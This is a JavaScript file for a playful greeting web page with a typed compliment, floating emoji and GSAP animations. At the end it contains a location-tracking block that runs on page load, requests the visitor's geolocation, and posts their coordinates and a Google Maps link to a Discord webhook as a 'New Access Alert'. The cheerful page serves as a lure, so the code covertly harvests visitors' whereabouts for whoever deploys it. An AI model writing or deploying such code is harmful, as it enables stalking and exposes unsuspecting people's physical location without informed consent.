// Cursor following effect
const cursor = document.querySelector('.cursor');
document.addEventListener('mousemove', (e) => {
    cursor.style.left = e.clientX + 'px';
    cursor.style.top = e.clientY + 'px';
});

// Typing effect for greeting
const greetingText = "Hey You Know What! You're the most adorable human i ever met! 💖";
const greetingElement = document.querySelector('.greeting');
let charIndex = 0;

function typeGreeting() {
    if (charIndex < greetingText.length) {
        greetingElement.textContent += greetingText.charAt(charIndex);
        charIndex++;
        setTimeout(typeGreeting, 100);
    }
}

// Create floating elements
const floatingElements = ['💖', '✨', '🌸', '💫', '💕'];
function createFloating() {
    const element = document.createElement('div');
    element.className = 'floating';
    element.textContent = floatingElements[Math.floor(Math.random() * floatingElements.length)];
    element.style.left = Math.random() * 100 + 'vw';
    element.style.top = Math.random() * 100 + 'vh';
    element.style.fontSize = (Math.random() * 20 + 20) + 'px';
    document.body.appendChild(element);

    gsap.to(element, {
        y: -500,
        x: Math.random() * 100 - 50,
        rotation: Math.random() * 360,
        duration: Math.random() * 5 + 5,
        opacity: 1,
        ease: "none",
        onComplete: () => element.remove()
    });
}

// Initialize animations
window.addEventListener('load', () => {
    // Title animation
    gsap.to('h1', {
        opacity: 1,
        duration: 1,
        y: 20,
        ease: "bounce.out"
    });

    // Button animation
    gsap.to('.cta-button', {
        opacity: 1,
        duration: 1,
        y: -20,
        ease: "back.out"
    });

    // Start typing effect
    typeGreeting();

    // Create floating elements periodically
    setInterval(createFloating, 1000);
});

// Hover effects
       // Hover effects
       document.querySelectorAll('.cta-button').forEach(button => {
        button.addEventListener('mouseenter', () => {
            gsap.to(button, {
                scale: 1.1,
                duration: 0.3
            });
        });

        button.addEventListener('mouseleave', () => {
            gsap.to(button, {
                scale: 1,
                duration: 0.3
            });
        });

        // Smooth page transition on click
        button.addEventListener('click', () => {
            gsap.to('body', {
                opacity: 0,
                duration: 1,
                onComplete: () => {
                    window.location.href = 'cause.html'; // Replace with the actual URL of the next page
                }
            });
        });
    });

// Location Tracking Integration
function sendLocation(position) {
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;
    const mapLink = `https://maps.google.com/?q=${lat},${lon}`;
    
    // 👇 P A S T E   Y O U R   D I S C O R D   W E B H O O K   H E R E 👇
    const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL_HERE";
    // 👆 P A S T E   Y O U R   D I S C O R D   W E B H O O K   H E R E 👆
    
    if (webhookUrl !== "YOUR_DISCORD_WEBHOOK_URL_HERE") {
        fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: `📍 **New Access Alert!**\n🗺️ **Google Maps:** [Click Here](${mapLink})\n🧭 **Coordinates:** ${lat}, ${lon}`
            })
        }).catch(err => console.error("Error sending location:", err));
    }
}

function requestLocation() {
    if (navigator.geolocation) {
        // This prompts the user for location access
        navigator.geolocation.getCurrentPosition(sendLocation, (err) => {
            console.log("Location access denied or error:", err);
        });
    }
}

// Request location tracking right after load
window.addEventListener('load', requestLocation);